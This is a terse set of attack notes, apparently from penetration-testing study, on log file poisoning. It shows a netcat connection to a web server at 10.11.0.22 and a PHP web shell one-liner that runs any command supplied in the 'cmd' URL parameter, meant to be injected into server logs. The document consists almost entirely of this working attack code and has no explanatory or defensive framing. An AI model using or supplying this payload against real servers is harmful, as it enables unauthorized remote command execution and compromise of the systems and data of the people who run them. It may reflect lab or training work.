# log file poisoning
## starting nc
nc -nv 10.11.0.22 80

## inserting script: 
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
